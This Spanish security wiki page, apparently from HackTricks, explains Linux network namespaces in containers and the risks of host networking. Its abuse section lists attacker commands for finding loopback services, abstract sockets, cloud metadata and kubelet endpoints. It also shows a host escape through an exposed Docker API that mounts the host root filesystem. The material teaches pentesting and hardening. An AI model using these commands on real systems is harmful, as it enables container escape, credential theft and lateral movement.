# Espacio de nombres de red

{{#include ../../../../../banners/hacktricks-training.md}}

## Descripción general

El espacio de nombres de red aísla recursos relacionados con la red, como interfaces, direcciones IP, tablas de enrutamiento, estado ARP/neighbor, reglas del firewall, sockets, el espacio de nombres abstracto de sockets de dominio UNIX y el contenido de archivos como `/proc/net`.<sup>[[2]](#references)</sup> Por eso, un contenedor puede tener lo que parece su propio `eth0`, sus propias rutas locales y su propio dispositivo de loopback sin ser propietario de la pila de red real del host.

Desde el punto de vista de la seguridad, esto es importante porque el aislamiento de red implica mucho más que la asignación de puertos. Un espacio de nombres de red privado limita lo que la carga de trabajo puede observar o reconfigurar directamente. Cuando ese espacio de nombres se comparte con el host, el contenedor puede obtener repentinamente visibilidad sobre los listeners del host, los servicios locales del host, los endpoints abstractos AF_UNIX y los puntos de control de red que nunca se pretendió exponer a la aplicación.

## Funcionamiento

Un espacio de nombres de red recién creado comienza con un entorno de red vacío o casi vacío hasta que se le conectan interfaces. A continuación, los container runtimes crean o conectan interfaces virtuales, asignan direcciones y configuran rutas para que la carga de trabajo tenga la conectividad esperada. En implementaciones basadas en bridges, esto normalmente significa que el contenedor ve una interfaz respaldada por veth conectada a un bridge del host. En Kubernetes, los plugins CNI gestionan la configuración equivalente para el networking de los Pods.

Esta arquitectura explica por qué `--network=host` o `hostNetwork: true` supone un cambio tan importante. En lugar de recibir una pila de red privada preparada, la carga de trabajo se une a la pila real del host.

## Lab

Puedes ver un espacio de nombres de red casi vacío con:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Y puedes comparar los contenedores normales y los contenedores con la red del host con:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
El contenedor con host networking ya no tiene su propia vista aislada de sockets e interfaces. Ese cambio por sí solo ya es significativo antes incluso de preguntar qué capabilities tiene el proceso.

## Uso en Runtime

Docker y Podman normalmente crean un network namespace privado para cada contenedor, salvo que se configure lo contrario. Kubernetes suele asignar a cada Pod su propio network namespace, compartido por los contenedores dentro de ese Pod, pero separado del host. Esto significa que `127.0.0.1` normalmente es local al Pod, no al contenedor: un listener vinculado únicamente a localhost en un contenedor suele ser accesible desde sus sidecars y contenedores hermanos. Los sistemas Incus/LXC también proporcionan un aislamiento basado en network namespaces, a menudo con una variedad más amplia de configuraciones de red virtual.

El principio común es que las redes privadas son el límite de aislamiento predeterminado, mientras que host networking es una exclusión explícita de ese límite.

## Misconfiguraciones

La misconfiguración más importante consiste simplemente en compartir el network namespace del host. Esto se hace a veces por rendimiento, monitorización de bajo nivel o comodidad, pero elimina uno de los límites más claros disponibles para los contenedores. Los listeners locales del host pasan a ser accesibles de forma más directa, los servicios accesibles únicamente desde localhost pueden quedar expuestos, y capabilities como `CAP_NET_ADMIN` o `CAP_NET_RAW` se vuelven mucho más peligrosas porque las operaciones que habilitan ahora se aplican al propio entorno de red del host.

Otro problema es otorgar demasiadas network-related capabilities incluso cuando el network namespace es privado. Un namespace privado ayuda, pero no hace inofensivos los raw sockets ni el control avanzado de red.

En Kubernetes, `hostNetwork: true` también cambia hasta qué punto puedes confiar en la segmentación de red a nivel de Pod. Kubernetes documenta que muchos network plugins no pueden distinguir correctamente el tráfico de los Pods con `hostNetwork` para la coincidencia de `podSelector` / `namespaceSelector` y, por tanto, lo tratan como tráfico ordinario del nodo.<sup>[[1]](#references)</sup> Desde el punto de vista de un atacante, esto significa que un workload comprometido con `hostNetwork` normalmente debería tratarse como un punto de apoyo de red a nivel de nodo, en lugar de como un Pod normal que sigue restringido por los mismos supuestos de políticas que los workloads de overlay-network.

## Abuse

En configuraciones con un aislamiento débil, los atacantes pueden inspeccionar los servicios en escucha del host, alcanzar endpoints de gestión vinculados únicamente a loopback, sniffear o interferir con el tráfico según las capabilities y el entorno concretos, o reconfigurar el routing y el estado del firewall si `CAP_NET_ADMIN` está presente. En un cluster, esto también puede facilitar el movimiento lateral y el reconocimiento del control plane.

Si sospechas que se está utilizando host networking, empieza confirmando que las interfaces y los listeners visibles pertenecen al host y no a una red de contenedor aislada:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Los servicios exclusivos de loopback suelen ser el primer descubrimiento interesante:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Los sockets UNIX abstractos son otro objetivo fácil de pasar por alto porque están delimitados por el network namespace, aunque no parecen listeners TCP/UDP y pueden no existir como rutas del sistema de archivos bajo `/run`. Por lo tanto, un contenedor con la red del host puede heredar acceso a canales de control exclusivos del host que nunca se bind-mountaron en el contenedor:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Un ejemplo histórico fue el bug de exposición de `containerd-shim` en un abstract-socket, pero la lección general es más importante que el CVE específico: una vez que un workload se une al network namespace del host, los servicios AF_UNIX abstractos también pasan a formar parte de la attack surface.<sup>[[3]](#references)</sup> Si esos sockets parecen relacionados con el runtime o son administrativos, cambia a [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Si hay network capabilities presentes, comprueba si el workload puede inspeccionar o modificar el stack visible:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
En kernels modernos, el networking del host junto con `CAP_NET_ADMIN` también puede exponer la ruta de paquetes más allá de simples cambios en `iptables` / `nftables`. Los qdiscs y filtros de `tc` también están delimitados por namespace, por lo que, en un host network namespace compartido, se aplican a las interfaces del host que el contenedor puede ver. Si además está presente `CAP_BPF`, los programas eBPF relacionados con la red, como los loaders de TC y XDP, también cobran relevancia:<sup>[[4]](#references)</sup>
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Esto es importante porque un atacante puede mirror, redirect, shape o drop traffic a nivel de la interfaz del host, no solo reescribir las firewall rules. En un private network namespace, esas acciones quedan contenidas en la vista del container; en un shared host namespace, pasan a afectar al host.

En entornos de cluster o cloud, el host networking también justifica un quick local recon de metadata y servicios adyacentes al control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
En Kubernetes, recuerda que comprometer **cualquier** container en un Pod con múltiples containers también proporciona acceso a los listeners de localhost abiertos por containers hermanos y sidecars, ya que todo el Pod comparte un único network namespace. Esto resulta especialmente relevante con containers de service-mesh, observabilidad y ayuda cuyas interfaces de administración o debug están diseñadas intencionadamente para ser internas al Pod en lugar de estar disponibles para todo el cluster:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Trata "bound to localhost" como **privado del Pod**, no como **privado del container**. Después de comprometer un container del Pod, esa suposición deja de ser válida.

### Ejemplo completo: Host Networking + acceso al Runtime local / Kubelet

Host networking no proporciona automáticamente root del host, pero a menudo expone servicios que intencionadamente solo son accesibles desde el propio node. Si uno de esos servicios está débilmente protegido, host networking se convierte en una vía directa de escalada de privilegios.

Docker API en localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet en localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impacto:

- compromiso directo del host si una API de runtime local está expuesta sin la protección adecuada
- reconocimiento del cluster o movimiento lateral si se puede acceder al kubelet o a agentes locales
- manipulación del tráfico o denegación de servicio cuando se combina con `CAP_NET_ADMIN`

## Comprobaciones

El objetivo de estas comprobaciones es determinar si el proceso tiene una pila de red privada, qué rutas y listeners son visibles, y si la vista de red ya parece la del host antes incluso de comprobar las capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Qué es interesante aquí:

- Si `/proc/self/ns/net` y `/proc/1/ns/net` ya parecen pertenecer al host, el contenedor puede estar compartiendo el network namespace del host u otro namespace no privado.
- `lsns -t net` y `ip netns identify` son útiles cuando el shell ya está dentro de un namespace con nombre o persistente y quieres correlacionarlo con los objetos de `/run/netns` desde el lado del host.
- `ss -lntup` es especialmente valioso porque revela listeners que solo están vinculados a loopback y endpoints de administración locales. `ss -xap` y `/proc/net/unix` añaden la vista de abstract sockets que las búsquedas normales de sockets en el sistema de archivos no detectan.
- Las rutas, los nombres de interfaces, el contexto del firewall, el estado de `tc` y los attachments de eBPF adquieren mucha más importancia si están presentes `CAP_NET_ADMIN`, `CAP_NET_RAW` o `CAP_BPF`.
- En Kubernetes, un fallo en la resolución de nombres de servicios desde un Pod con `hostNetwork` puede significar simplemente que el Pod no está usando `dnsPolicy: ClusterFirstWithHostNet`, y no que el servicio esté ausente.
- En Pods con varios contenedores, los listeners de localhost pertenecen a todo el network namespace del Pod, así que comprueba los sidecars y los contenedores hermanos antes de asumir que un puerto accesible solo desde loopback es inalcanzable desde el contenedor comprometido.

Al revisar un contenedor, evalúa siempre el network namespace junto con el conjunto de capabilities. Usar la red del host junto con capabilities de red potentes implica una postura muy distinta a usar una red bridge con un conjunto reducido de capabilities predeterminadas.

## Referencias

- [1] [Caveats de Kubernetes NetworkPolicy y `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [2] [`network_namespaces(7)` de Linux y aislamiento de abstract UNIX sockets](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [3] [Advisory de containerd: abstract Unix domain sockets expuestos a contenedores con red del host](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [4] [Requisitos de eBPF token y capabilities para programas eBPF relacionados con la red](https://docs.ebpf.io/linux/concepts/token/)

{{#include ../../../../../banners/hacktricks-training.md}}
